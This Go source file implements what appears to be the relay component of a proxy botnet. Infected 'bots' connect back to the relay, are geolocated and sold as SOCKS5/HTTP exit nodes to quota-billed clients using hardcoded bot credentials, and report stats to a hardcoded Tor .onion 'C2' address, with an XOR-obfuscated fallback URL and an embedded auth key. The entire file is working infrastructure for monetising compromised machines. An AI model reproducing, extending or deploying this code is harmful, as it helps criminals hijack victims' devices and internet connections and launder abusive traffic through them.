package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/proxy"
)

// ============================================================================
// BACKCONNECT SOCKS5 RELAY SERVER
//
// Sits between SOCKS5 clients and bots. Bots connect OUT to this relay
// (backconnect), so neither the C2 nor the bot exposes a listening port.
//
// Protocol:
//   Bot -> Relay (EZF3):  "RELAY_AUTH:<key>:<botID>\n"   -> control channel
//   Relay -> Bot:              "RELAY_OK\n"
//   Relay -> Bot:              "RELAY_NEW:<sessionID>\n"      -> new client waiting
//   Bot -> Relay (EZF3):  "RELAY_DATA:<sessionID>\n"     -> data channel
//   Bot runs SOCKS5 protocol over the data channel.
//
// Usage:
//   ./relay -key <auth_key> [-cp 9001] [-sp 1080] [-stats 127.0.0.1:9090]
// ============================================================================

type bot struct {
	id          string
	ctrl        net.Conn
	mu          sync.Mutex // protects writes to ctrl
	addr        string     // remote address
	connectedAt time.Time
	sliceIdx    int        // index in botSlice for O(1) removal
	// Geolocation — populated asynchronously after registration
	geo   *GeoInfo
	geoMu sync.RWMutex
}

var (
	bots     = make(map[string]*bot)
	botsMu   sync.RWMutex
	botSlice []*bot  // maintained alongside bots map for O(1) round-robin
	botRR    uint64  // atomic round-robin counter
)

var (
	pendingSessions   = make(map[string]chan net.Conn)
	pendingSessionsMu sync.Mutex
	sessionCounter    int64 // atomic, avoids UnixNano collisions at high concurrency
)

// ============================================================================
// CONFIG -- patched by setup.py at build time
// ============================================================================

var defaultAuthKey = "UZq1tckrZ0dC1lvQ"   //setup:authkey
var defaultControlPort = "9001"             //setup:cp
var defaultSocksPort = "1080"               //setup:sp
var defaultStatsAddr = ""                   //setup:stats
var defaultReportURLObf = ""               //setup:report_obf
var defaultReportURLTor = "http://5htpx4lq3dyqnosb3d3fxdy7y6v775orta522fhnrhy7rq2rufzrpiyd.onion/relay/report" //setup:report_tor
var defaultRelayName = ""                   //setup:name
var defaultRedisURL = ""                    //setup:redis
var defaultBotUser = "vision"               //setup:botuser
var defaultBotPass = "vision"               //setup:botpass

func xorDecode(obf string) string {
	if obf == "" {
		return ""
	}
	key := []byte(defaultAuthKey)
	data := []byte(obf)
	out := make([]byte, len(data))
	for i := range data {
		out[i] = data[i] ^ key[i%len(key)]
	}
	return string(out)
}

// ============================================================================
// STATS -- atomic counters for live monitoring
// ============================================================================

var (
	statTotalSessions  int64
	statActiveSessions int64
	statTotalBytesUp   int64
	statTotalBytesDown int64
	statFailedSessions int64
	statTotalBots      int64
	statAuthFailures   int64
)

// ============================================================================
// RELAY AUTH RATE LIMITER -- simple IP-based block after failed auth
// ============================================================================

var (
	relayAuthLimiter     = make(map[string]time.Time) // IP -> blocked until
	relayAuthLimiterLock sync.Mutex
	relayAuthBlockDur    = 5 * time.Minute
)

func relayAuthIsBlocked(ip string) bool {
	relayAuthLimiterLock.Lock()
	defer relayAuthLimiterLock.Unlock()
	until, ok := relayAuthLimiter[ip]
	if !ok {
		return false
	}
	if time.Now().Before(until) {
		return true
	}
	delete(relayAuthLimiter, ip)
	return false
}

func relayAuthBlock(ip string) {
	relayAuthLimiterLock.Lock()
	relayAuthLimiter[ip] = time.Now().Add(relayAuthBlockDur)
	relayAuthLimiterLock.Unlock()
	log.Printf("[RELAY-RATELIMIT] Blocked IP %s for %v after auth failure", ip, relayAuthBlockDur)
}

func main() {
	controlPort := flag.String("cp", defaultControlPort, "Control port (EZF3)")
	socksPort := flag.String("sp", defaultSocksPort, "SOCKS5 port")
	authKey := flag.String("key", "", "Auth key override")
	statsAddr := flag.String("stats", defaultStatsAddr, "Stats API endpoint (e.g. 0.0.0.0:9090)")
	reportURL := flag.String("report", "", "C2 report URL override")
	relayName := flag.String("name", defaultRelayName, "Relay name")
	redisURL := flag.String("redis", defaultRedisURL, "Redis URL (redis://:pass@host:6379)")
	cityDB  := flag.String("geodb",  "/etc/relay/GeoLite2-City.mmdb", "MaxMind GeoLite2-City.mmdb path")
	asnDB   := flag.String("asndb",  "/etc/relay/GeoLite2-ASN.mmdb",  "MaxMind GeoLite2-ASN.mmdb path (optional)")
	tlsCert := flag.String("tlscert", "", "TLS cert PEM for HTTPS-proxy mode (optional; self-signed if empty)")
	tlsKey  := flag.String("tlskey",  "", "TLS key PEM for HTTPS-proxy mode (optional; self-signed if empty)")
	flag.Parse()

	key := *authKey
	if key == "" {
		key = defaultAuthKey
	}
	if key == "" {
		log.Fatal("[RELAY] No auth key -- run setup.py")
	}

	name := *relayName
	if name == "" {
		if extIP := getExternalIP(); extIP != "" {
			name = extIP + ":" + *socksPort
		} else {
			if h, err := os.Hostname(); err == nil {
				name = h + ":" + *socksPort
			} else {
				name = "relay-" + *socksPort
			}
		}
	}


	// ── TLS for HTTPS-proxy mode (self-signed generated if no cert given) ──
	InitProxyTLS(*tlsCert, *tlsKey)

	// ── GeoIP databases (optional but recommended) ───────────────────────
	if err := InitGeoDBs(*cityDB, *asnDB); err != nil {
		log.Printf("[GEO] WARNING: GeoIP disabled — %v", err)
		log.Printf("[GEO] Download free DBs: https://dev.maxmind.com/geoip/geolite2-free-geolocation-data")
		log.Printf("[GEO] Place at %s and %s, then restart", *cityDB, *asnDB)
	}

	// ── Redis (required) ─────────────────────────────────────────────────
	rURL := *redisURL
	if rURL == "" {
		log.Fatal("[RELAY] Redis URL required — use -redis flag: redis://:pass@host:6379")
	}
	if err := initRedis(rURL); err != nil {
		log.Fatalf("[RELAY] Redis connection failed: %v", err)
	}

	if *statsAddr != "" {
		go statsAPIListener(*statsAddr, key)
	}

	resolvedReport := *reportURL
	if resolvedReport == "" {
		resolvedReport = xorDecode(defaultReportURLObf)
	}
	if resolvedReport == "" {
		resolvedReport = defaultReportURLTor
	}
	if resolvedReport != "" {
		go statsReporter(resolvedReport, name, *socksPort, key)
	}

	go controlListener(*controlPort, key)

	socksListener(*socksPort)
}

// ============================================================================
// CONTROL PORT — bots connect here (EZF3 encrypted TCP)
// ============================================================================

func controlListener(port, authKey string) {
	ln, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		log.Fatalf("[RELAY] Control listen failed on :%s: %v", port, err)
	}
	log.Printf("[RELAY] Control port :%s (EZF3) — waiting for bots", port)
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go func(c net.Conn) {
			encrypted, err := HandleEZF3Handshake(c, authKey)
			if err != nil {
				log.Printf("[RELAY] EZF3 failed from %s: %v", c.RemoteAddr(), err)
				c.Close()
				return
			}
			handleIncoming(encrypted, authKey)
		}(conn)
	}
}

func handleIncoming(conn net.Conn, authKey string) {
	// Extract remote IP for rate limiting
	remoteIP := conn.RemoteAddr().String()
	if host, _, err := net.SplitHostPort(remoteIP); err == nil {
		remoteIP = host
	}

	// Check if this IP is rate-limited before doing any work
	if relayAuthIsBlocked(remoteIP) {
		conn.Close()
		return
	}

	reader := bufio.NewReader(conn)
	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	line, err := reader.ReadString('\n')
	if err != nil {
		conn.Close()
		return
	}
	line = strings.TrimSpace(line)

	// DATA channel -- bot connecting back for a session
	if strings.HasPrefix(line, "RELAY_DATA:") {
		sessionID := strings.TrimPrefix(line, "RELAY_DATA:")
		conn.SetReadDeadline(time.Time{})
		deliverDataConn(sessionID, conn)
		return
	}

	// AUTH -- new bot control connection
	if !strings.HasPrefix(line, "RELAY_AUTH:") {
		conn.Close()
		return
	}
	parts := strings.SplitN(strings.TrimPrefix(line, "RELAY_AUTH:"), ":", 2)
	if len(parts) != 2 || parts[0] != authKey {
		atomic.AddInt64(&statAuthFailures, 1)
		relayAuthBlock(remoteIP)
		conn.Write([]byte("RELAY_FAIL\n"))
		conn.Close()
		return
	}
	botID := parts[1]
	conn.SetReadDeadline(time.Time{})
	if _, err := conn.Write([]byte("RELAY_OK\n")); err != nil {
		log.Printf("[RELAY] RELAY_OK write failed for %s (bot %s): %v", conn.RemoteAddr(), botID, err)
		conn.Close()
		return
	}
	log.Printf("[RELAY] RELAY_OK sent to %s (bot %s)", conn.RemoteAddr(), botID)

	b := &bot{id: botID, ctrl: conn, addr: conn.RemoteAddr().String(), connectedAt: time.Now()}

	// Use a unique internal key to allow multiple connections from the same botID.
	// Two concurrent threads from the same bot (competing reconnect loops) should
	// NOT kill each other — just let both coexist and use the freshest one for routing.
	internalKey := fmt.Sprintf("%s_%s", botID, conn.RemoteAddr().String())

	botsMu.Lock()
	b.sliceIdx = len(botSlice)
	bots[internalKey] = b
	botSlice = append(botSlice, b)
	botsMu.Unlock()
	atomic.AddInt64(&statTotalBots, 1)
	log.Printf("[RELAY] Bot registered: %s (%s)", botID, conn.RemoteAddr())

	// Async GeoIP lookup — populates b.geo for targeting filters
	if botIP, _, err := net.SplitHostPort(conn.RemoteAddr().String()); err == nil {
		LookupGeoAsync(b, botIP)
	}

	// Bidirectional keepalive — relay sends \n to bot every 20s, bot echoes \n back.
	// This keeps NAT mappings alive AND detects half-open connections from both sides.
	// IMPORTANT: use the same bufio.Reader that read the auth line — if we call
	// conn.Read() directly, bytes already buffered in 'reader' are skipped.
	readErr := make(chan error, 1)
	go func() {
		var rxBytes int64
		for {
			conn.SetReadDeadline(time.Now().Add(2 * time.Minute))
			_, err := reader.ReadByte()
			if err != nil {
				log.Printf("[RELAY] Bot %s read goroutine exit after %d bytes: %v", botID, rxBytes, err)
				readErr <- err
				return
			}
			rxBytes++
		}
	}()

	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case err := <-readErr:
			log.Printf("[RELAY] Bot %s read error: %v", botID, err)
			goto botDisconnected
		case <-ticker.C:
			b.mu.Lock()
			_, err := conn.Write([]byte("\n"))
			b.mu.Unlock()
			if err != nil {
				log.Printf("[RELAY] Bot %s write error (keepalive): %v", botID, err)
				goto botDisconnected
			}
		}
	}
botDisconnected:

	botsMu.Lock()
	delete(bots, internalKey)
	// O(1) removal: swap with last element, update the moved bot's sliceIdx
	idx := b.sliceIdx
	last := len(botSlice) - 1
	if idx <= last {
		if idx < last {
			botSlice[idx] = botSlice[last]
			botSlice[idx].sliceIdx = idx
		}
		botSlice[last] = nil
		botSlice = botSlice[:last]
	}
	botsMu.Unlock()

	// Clean up any sticky sessions pointing to this bot
	removeSessionsForBot(b)

	conn.Close()
	log.Printf("[RELAY] Bot disconnected: %s (%s)", botID, conn.RemoteAddr())
}

func deliverDataConn(sessionID string, conn net.Conn) {
	pendingSessionsMu.Lock()
	ch, exists := pendingSessions[sessionID]
	if exists {
		delete(pendingSessions, sessionID)
	}
	pendingSessionsMu.Unlock()

	if !exists {
		conn.Close()
		return
	}
	ch <- conn
}

// ============================================================================
// PROXY PORT -- SOCKS5 + HTTP + HTTPS on the same port
//
// Protocol is auto-detected from the first byte:
//   0x05  → SOCKS5
//   other → HTTP proxy (GET/POST/CONNECT)
// ============================================================================

func socksListener(port string) {
	ln, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		log.Fatalf("[RELAY] Proxy listen failed on :%s: %v", port, err)
	}
	log.Printf("[RELAY] Proxy port :%s -- SOCKS5 + HTTP + HTTPS ready", port)
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleProxyClient(conn)
	}
}

// handleProxyClient peeks at the first byte to decide protocol:
//   0x05 → SOCKS5
//   0x16 → TLS ClientHello → upgrade to TLS, then re-detect inner protocol
//   other → plain HTTP proxy (CONNECT for HTTPS, GET/POST for HTTP)
func handleProxyClient(conn net.Conn) {
	br := bufio.NewReader(conn)
	first, err := br.Peek(1)
	if err != nil {
		conn.Close()
		return
	}

	// TLS ClientHello starts with 0x16 (content type "handshake")
	if first[0] == 0x16 {
		if proxyTLSConfig == nil {
			conn.Close()
			return
		}
		// Upgrade: bufConn ensures the already-peeked byte is not lost
		tlsConn := tls.Server(&bufConn{Conn: conn, r: br}, proxyTLSConfig)
		if err := tlsConn.Handshake(); err != nil {
			log.Printf("[TLS] Handshake failed from %s: %v", conn.RemoteAddr(), err)
			tlsConn.Close()
			return
		}
		// Re-wrap for inner protocol detection
		br2 := bufio.NewReader(tlsConn)
		inner, err := br2.Peek(1)
		if err != nil {
			tlsConn.Close()
			return
		}
		if inner[0] == 0x05 {
			handleSocksClient(&bufConn{Conn: tlsConn, r: br2})
		} else {
			handleHTTPProxyClient(tlsConn, br2)
		}
		return
	}

	if first[0] == 0x05 {
		// SOCKS5 — pass bufConn so peeked byte is not lost
		handleSocksClient(&bufConn{Conn: conn, r: br})
	} else {
		// Plain HTTP proxy (CONNECT or GET/POST)
		handleHTTPProxyClient(conn, br)
	}
}

func handleSocksClient(clientConn net.Conn) {
	// ── SOCKS5 auth against Redis (credentials + quota check) ────────────
	creds, err := Socks5Authenticate(clientConn)
	if err != nil {
		log.Printf("[RELAY] Auth failed from %s: %v", clientConn.RemoteAddr(), err)
		atomic.AddInt64(&statFailedSessions, 1)
		clientConn.Close()
		return
	}

	// ── Pick a bot (with geo/session targeting) ───────────────────────────
	b := pickBotWithFilter(creds.Filter)
	if b == nil {
		atomic.AddInt64(&statFailedSessions, 1)
		clientConn.Close()
		return
	}

	sessionID := fmt.Sprintf("%d", atomic.AddInt64(&sessionCounter, 1))

	ch := make(chan net.Conn, 1)
	pendingSessionsMu.Lock()
	pendingSessions[sessionID] = ch
	pendingSessionsMu.Unlock()

	// Signal bot to open a data connection
	b.mu.Lock()
	_, err = b.ctrl.Write([]byte("RELAY_NEW:" + sessionID + "\n"))
	b.mu.Unlock()
	if err != nil {
		atomic.AddInt64(&statFailedSessions, 1)
		pendingSessionsMu.Lock()
		delete(pendingSessions, sessionID)
		pendingSessionsMu.Unlock()
		clientConn.Close()
		return
	}

	// Wait for bot data connection
	select {
	case dataConn := <-ch:
		atomic.AddInt64(&statTotalSessions, 1)
		atomic.AddInt64(&statActiveSessions, 1)

		// The bot runs a full SOCKS5 server. Perform userpass handshake using
		// the same credentials the client sent (relay already verified them).
		failSession := func(format string, args ...interface{}) {
			log.Printf("[RELAY] Session "+sessionID+": "+format, args...)
			atomic.AddInt64(&statFailedSessions, 1)
			dataConn.Close()
			clientConn.Close()
			atomic.AddInt64(&statActiveSessions, -1)
		}
		dataConn.SetDeadline(time.Now().Add(10 * time.Second))

		// Step 1: offer userpass auth
		if _, err := dataConn.Write([]byte{0x05, 0x01, 0x02}); err != nil {
			failSession("bot greeting write error: %v", err)
			return
		}
		// Step 2: read bot's method choice
		methodChoice := make([]byte, 2)
		if _, err := io.ReadFull(dataConn, methodChoice); err != nil {
			failSession("bot method choice read error: %v", err)
			return
		}
		if methodChoice[0] != 0x05 || methodChoice[1] != 0x02 {
			failSession("bot chose unexpected method: %x %x", methodChoice[0], methodChoice[1])
			return
		}
		// Step 3: send bot's internal SOCKS5 credentials (vision:vision by default)
		user := []byte(defaultBotUser)
		pass := []byte(defaultBotPass)
		authPkt := make([]byte, 3+len(user)+len(pass))
		authPkt[0] = 0x01
		authPkt[1] = byte(len(user))
		copy(authPkt[2:], user)
		authPkt[2+len(user)] = byte(len(pass))
		copy(authPkt[3+len(user):], pass)
		if _, err := dataConn.Write(authPkt); err != nil {
			failSession("bot auth send error: %v", err)
			return
		}
		// Step 4: read bot's auth result
		authResult := make([]byte, 2)
		if _, err := io.ReadFull(dataConn, authResult); err != nil {
			failSession("bot auth result read error: %v", err)
			return
		}
		if authResult[1] != 0x00 {
			failSession("bot rejected credentials (result: %x)", authResult[1])
			return
		}
		dataConn.SetDeadline(time.Time{})

		// Bridge with real-time quota enforcement (deducts every 1 MB)
		bridgeWithQuota(clientConn, dataConn, creds.UserID)

		atomic.AddInt64(&statActiveSessions, -1)

	case <-time.After(15 * time.Second):
		atomic.AddInt64(&statFailedSessions, 1)
		pendingSessionsMu.Lock()
		delete(pendingSessions, sessionID)
		pendingSessionsMu.Unlock()
		clientConn.Close()
	}
}

func pickBot() *bot {
	botsMu.RLock()
	defer botsMu.RUnlock()
	n := len(botSlice)
	if n == 0 {
		return nil
	}
	idx := atomic.AddUint64(&botRR, 1) % uint64(n)
	return botSlice[idx]
}

func bridge(a, b net.Conn) {
	done := make(chan struct{}, 2)
	go func() {
		n, _ := io.Copy(a, b)
		atomic.AddInt64(&statTotalBytesDown, n)
		done <- struct{}{}
	}()
	go func() {
		n, _ := io.Copy(b, a)
		atomic.AddInt64(&statTotalBytesUp, n)
		done <- struct{}{}
	}()
	<-done
	a.Close()
	b.Close()
	<-done
}

// bridgeCounted pipes data bidirectionally and returns (upload, download) byte counts.
// upload = client→bot, download = bot→client.
func bridgeCounted(client, bot net.Conn) (upload, download int64) {
	done := make(chan struct{}, 2)
	go func() {
		n, _ := io.Copy(bot, client)
		atomic.AddInt64(&statTotalBytesUp, n)
		upload = n
		done <- struct{}{}
	}()
	go func() {
		n, _ := io.Copy(client, bot)
		atomic.AddInt64(&statTotalBytesDown, n)
		download = n
		done <- struct{}{}
	}()
	<-done
	client.Close()
	bot.Close()
	<-done
	return
}

// bridgeWithQuota pipes data bidirectionally while enforcing Redis quota in real time.
// Every 256 KB transferred is deducted from the user's quota.
// If quota reaches zero the connection is closed immediately — mid-transfer.
func bridgeWithQuota(client, bot net.Conn, userID string) {
	const deductEvery = int64(256 * 1024) // 256 KB per deduction interval (more frequent = less overuse)

	// closeOnce ensures both sides are closed exactly once.
	var closeOnce sync.Once
	closeAll := func() {
		closeOnce.Do(func() {
			client.Close()
			bot.Close()
		})
	}

	// deductAndCheck deducts n bytes from Redis and closes the connection
	// if the user's quota is now exhausted. Returns false when quota is gone.
	deductAndCheck := func(n int64) bool {
		if n <= 0 {
			return true
		}
		remaining, err := DeductQuota(context.Background(), userID, n)
		if err != nil {
			// Redis error — fail closed: terminate session to prevent free usage
			log.Printf("[RELAY] quota deduct error for %s: %v — closing session", userID, err)
			closeAll()
			return false
		}
		if remaining <= 0 {
			log.Printf("[RELAY] user %s quota exhausted — closing connection", userID)
			closeAll()
			return false
		}
		return true
	}

	// copyDir copies src→dst in 32 KB chunks, accumulating byte counts and
	// deducting from Redis quota every deductEvery bytes.
	copyDir := func(dst, src net.Conn, globalCounter *int64) {
		buf := make([]byte, 32*1024)
		var total, pending int64
		for {
			nr, rerr := src.Read(buf)
			if nr > 0 {
				nw, werr := dst.Write(buf[:nr])
				if nw > 0 {
					total += int64(nw)
					pending += int64(nw)
					if pending >= deductEvery {
						if !deductAndCheck(pending) {
							atomic.AddInt64(globalCounter, total)
							return
						}
						pending = 0
					}
				}
				if werr != nil {
					deductAndCheck(pending)
					atomic.AddInt64(globalCounter, total)
					return
				}
			}
			if rerr != nil {
				deductAndCheck(pending)
				atomic.AddInt64(globalCounter, total)
				return
			}
		}
	}

	done := make(chan struct{}, 2)
	go func() {
		copyDir(bot, client, &statTotalBytesUp)
		closeAll()
		done <- struct{}{}
	}()
	go func() {
		copyDir(client, bot, &statTotalBytesDown)
		closeAll()
		done <- struct{}{}
	}()
	<-done
	<-done
}

// ============================================================================
// STATS -- HTTP JSON API + periodic reporting to C2
// ============================================================================

type RelayStats struct {
	Name           string `json:"name"`
	SocksPort      string `json:"socks_port"`
	TotalSessions  int64  `json:"sessions_total"`
	ActiveSessions int64  `json:"sessions_active"`
	FailedSessions int64  `json:"sessions_failed"`
	BytesUp        int64  `json:"bytes_up"`
	BytesDown      int64  `json:"bytes_down"`
	ConnectedBots  int    `json:"connected_bots"`
	TotalBotConns  int64  `json:"total_bot_connects"`
	AuthFailures   int64  `json:"auth_failures"`
	Timestamp      string `json:"timestamp"`
}

func gatherStats(name, socksPort string) RelayStats {
	botsMu.RLock()
	connectedBots := len(bots)
	botsMu.RUnlock()

	return RelayStats{
		Name:           name,
		SocksPort:      socksPort,
		TotalSessions:  atomic.LoadInt64(&statTotalSessions),
		ActiveSessions: atomic.LoadInt64(&statActiveSessions),
		FailedSessions: atomic.LoadInt64(&statFailedSessions),
		BytesUp:        atomic.LoadInt64(&statTotalBytesUp),
		BytesDown:      atomic.LoadInt64(&statTotalBytesDown),
		ConnectedBots:  connectedBots,
		TotalBotConns:  atomic.LoadInt64(&statTotalBots),
		AuthFailures:   atomic.LoadInt64(&statAuthFailures),
		Timestamp:      time.Now().UTC().Format(time.RFC3339),
	}
}

func statsAPIListener(addr, authKey string) {
	requireAuth := func(next http.HandlerFunc) http.HandlerFunc {
		return func(w http.ResponseWriter, r *http.Request) {
			key := r.Header.Get("X-Relay-Key")
			if key == "" {
				key = r.URL.Query().Get("key")
			}
			if key != authKey {
				http.Error(w, "unauthorized", http.StatusUnauthorized)
				return
			}
			next(w, r)
		}
	}

	mux := http.NewServeMux()

	mux.HandleFunc("/stats", requireAuth(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		s := gatherStats("", "")
		type botEntry struct {
			ID      string `json:"id"`
			Addr    string `json:"addr"`
			Country string `json:"country,omitempty"`
			City    string `json:"city,omitempty"`
			ISP     string `json:"isp,omitempty"`
			ASN     string `json:"asn,omitempty"`
		}
		type localStats struct {
			RelayStats
			Bots []botEntry `json:"bots"`
		}
		botsMu.RLock()
		entries := make([]botEntry, 0, len(botSlice))
		for _, b := range botSlice {
			e := botEntry{ID: b.id, Addr: b.addr}
			b.geoMu.RLock()
			if b.geo != nil {
				e.Country = b.geo.Country
				e.City = b.geo.City
				e.ISP = b.geo.ISP
				e.ASN = b.geo.ASN
			}
			b.geoMu.RUnlock()
			entries = append(entries, e)
		}
		botsMu.RUnlock()
		json.NewEncoder(w).Encode(localStats{s, entries})
	}))

	// /bots — list bots with optional country/city/isp/asn filtering + aggregate counts
	// Query params: country=US, city=chicago, isp=comcast, asn=7922, limit=N
	mux.HandleFunc("/bots", requireAuth(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		q := r.URL.Query()
		filterCountry := strings.ToUpper(q.Get("country"))
		filterCity := strings.ToLower(q.Get("city"))
		filterISP := strings.ToLower(q.Get("isp"))
		filterASN := q.Get("asn")

		type botEntry struct {
			ID      string `json:"id"`
			IP      string `json:"ip"`
			Country string `json:"country"`
			Region  string `json:"region,omitempty"`
			City    string `json:"city,omitempty"`
			ISP     string `json:"isp,omitempty"`
			ASN     string `json:"asn,omitempty"`
		}
		type countryCount struct {
			Country string `json:"country"`
			Count   int    `json:"count"`
		}
		type response struct {
			Total     int            `json:"total"`
			Filtered  int            `json:"filtered"`
			Countries []countryCount `json:"countries"`
			Bots      []botEntry     `json:"bots"`
		}

		countryCounts := make(map[string]int)
		var matched []botEntry

		botsMu.RLock()
		for _, b := range botSlice {
			b.geoMu.RLock()
			geo := b.geo
			b.geoMu.RUnlock()

			// Country aggregate (all bots)
			if geo != nil && geo.Country != "" {
				countryCounts[geo.Country]++
			}

			// Filtering
			if filterCountry != "" {
				if geo == nil || !strings.EqualFold(geo.Country, filterCountry) {
					continue
				}
			}
			if filterCity != "" {
				if geo == nil {
					continue
				}
				norm := strings.ToLower(strings.ReplaceAll(geo.City, " ", ""))
				if !strings.Contains(norm, filterCity) {
					continue
				}
			}
			if filterISP != "" {
				if geo == nil || !strings.Contains(strings.ToLower(geo.ISP), filterISP) {
					continue
				}
			}
			if filterASN != "" {
				if geo == nil || geo.ASN != filterASN {
					continue
				}
			}

			e := botEntry{ID: b.id, IP: b.addr}
			if geo != nil {
				e.Country = geo.Country
				e.Region = geo.Region
				e.City = geo.City
				e.ISP = geo.ISP
				e.ASN = geo.ASN
			}
			matched = append(matched, e)
		}
		total := len(botSlice)
		botsMu.RUnlock()

		// Build sorted country list
		cc := make([]countryCount, 0, len(countryCounts))
		for c, n := range countryCounts {
			cc = append(cc, countryCount{c, n})
		}
		// Sort by count desc
		for i := 0; i < len(cc); i++ {
			for j := i + 1; j < len(cc); j++ {
				if cc[j].Count > cc[i].Count {
					cc[i], cc[j] = cc[j], cc[i]
				}
			}
		}

		json.NewEncoder(w).Encode(response{
			Total:     total,
			Filtered:  len(matched),
			Countries: cc,
			Bots:      matched,
		})
	}))

	mux.HandleFunc("/text", requireAuth(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/plain")
		s := gatherStats("", "")
		fmt.Fprintf(w, "Sessions total:    %d\n", s.TotalSessions)
		fmt.Fprintf(w, "Sessions active:   %d\n", s.ActiveSessions)
		fmt.Fprintf(w, "Sessions failed:   %d\n", s.FailedSessions)
		fmt.Fprintf(w, "Bandwidth up:      %s\n", formatBytes(s.BytesUp))
		fmt.Fprintf(w, "Bandwidth down:    %s\n", formatBytes(s.BytesDown))
		fmt.Fprintf(w, "Bandwidth total:   %s\n", formatBytes(s.BytesUp+s.BytesDown))
		fmt.Fprintf(w, "Connected bots:    %d\n", s.ConnectedBots)
		fmt.Fprintf(w, "Total bot conns:   %d\n", s.TotalBotConns)
		fmt.Fprintf(w, "Auth failures:     %d\n", s.AuthFailures)
		botsMu.RLock()
		ids := make([]string, 0, len(bots))
		for id := range bots {
			ids = append(ids, id)
		}
		botsMu.RUnlock()
		if len(ids) > 0 {
			fmt.Fprintf(w, "Bot IDs:           %s\n", strings.Join(ids, ", "))
		}
	}))

	log.Printf("[RELAY] Stats API on http://%s (auth required: X-Relay-Key header or ?key= param)", addr)
	if err := http.ListenAndServe(addr, mux); err != nil {
		log.Printf("[RELAY] Stats API failed: %v", err)
	}
}

func statsReporter(reportURLs, relayName, socksPort, authKey string) {
	urls := strings.Split(reportURLs, ",")
	for i := range urls {
		urls[i] = strings.TrimSpace(urls[i])
	}
	log.Printf("[RELAY] Reporting stats to %d C2 URL(s) every 30s as '%s'", len(urls), relayName)

	// Build two clients: plain for clearnet, Tor-proxied for .onion
	plainClient := &http.Client{Timeout: 10 * time.Second}
	var torClient *http.Client

	// Check if any URL is .onion — if so, set up Tor SOCKS5 client
	needsTor := false
	for _, u := range urls {
		if strings.Contains(u, ".onion") {
			needsTor = true
			break
		}
	}
	if needsTor {
		torProxy := "127.0.0.1:9050"
		if env := os.Getenv("TOR_SOCKS"); env != "" {
			torProxy = env
		}
		dialer, err := proxy.SOCKS5("tcp", torProxy, nil, proxy.Direct)
		if err != nil {
			log.Printf("[RELAY] WARNING: Tor SOCKS5 proxy at %s unavailable: %v", torProxy, err)
			log.Printf("[RELAY] .onion URLs will fail. Install tor: apt install tor")
		} else {
			contextDialer, ok := dialer.(proxy.ContextDialer)
			if ok {
				torClient = &http.Client{
					Timeout: 30 * time.Second,
					Transport: &http.Transport{
						DialContext: contextDialer.DialContext,
					},
				}
			} else {
				torClient = &http.Client{
					Timeout: 30 * time.Second,
					Transport: &http.Transport{
						Dial: dialer.Dial,
					},
				}
			}
			log.Printf("[RELAY] Tor SOCKS5 client configured via %s", torProxy)
		}
	}

	reportNum := 0
	for {
		stats := gatherStats(relayName, socksPort)
		body, _ := json.Marshal(stats)
		reportNum++

		reported := false
		for _, rawURL := range urls {
			if rawURL == "" {
				continue
			}
			// Pick the right client based on URL
			parsed, err := url.Parse(rawURL)
			if err != nil {
				log.Printf("[RELAY] Report #%d: invalid URL %q: %v", reportNum, rawURL, err)
				continue
			}
			client := plainClient
			isTor := false
			if strings.HasSuffix(parsed.Hostname(), ".onion") {
				if torClient == nil {
					log.Printf("[RELAY] Report #%d: skipping .onion URL (no Tor client): %s", reportNum, rawURL)
					continue
				}
				client = torClient
				isTor = true
			}

			req, err := http.NewRequest("POST", rawURL, bytes.NewReader(body))
			if err != nil {
				log.Printf("[RELAY] Report #%d: request build error: %v", reportNum, err)
				continue
			}
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("X-Relay-Key", authKey)

			if reportNum <= 3 || reportNum%10 == 0 {
				log.Printf("[RELAY] Report #%d: POST %s (tor=%v, bots=%d, sessions=%d)",
					reportNum, rawURL, isTor, stats.ConnectedBots, stats.TotalSessions)
			}

			resp, err := client.Do(req)
			if err != nil {
				log.Printf("[RELAY] Report #%d to %s FAILED: %v", reportNum, rawURL, err)
				continue
			}
			resp.Body.Close()
			if resp.StatusCode == 200 {
				reported = true
				if reportNum <= 3 || reportNum%10 == 0 {
					log.Printf("[RELAY] Report #%d: OK (HTTP 200)", reportNum)
				}
				break
			} else {
				log.Printf("[RELAY] Report #%d to %s got HTTP %d", reportNum, rawURL, resp.StatusCode)
			}
		}
		if !reported {
			log.Printf("[RELAY] Report #%d FAILED to all %d C2 URLs", reportNum, len(urls))
		}

		time.Sleep(30 * time.Second)
	}
}

func getExternalIP() string {
	client := &http.Client{Timeout: 5 * time.Second}
	for _, url := range []string{"https://api.ipify.org", "https://ifconfig.me/ip", "https://icanhazip.com"} {
		resp, err := client.Get(url)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 64))
		resp.Body.Close()
		ip := strings.TrimSpace(string(body))
		if net.ParseIP(ip) != nil {
			return ip
		}
	}
	return ""
}

func formatBytes(b int64) string {
	const (
		KB = 1024
		MB = KB * 1024
		GB = MB * 1024
	)
	switch {
	case b >= GB:
		return fmt.Sprintf("%.2f GB", float64(b)/float64(GB))
	case b >= MB:
		return fmt.Sprintf("%.2f MB", float64(b)/float64(MB))
	case b >= KB:
		return fmt.Sprintf("%.2f KB", float64(b)/float64(KB))
	default:
		return fmt.Sprintf("%d B", b)
	}
}
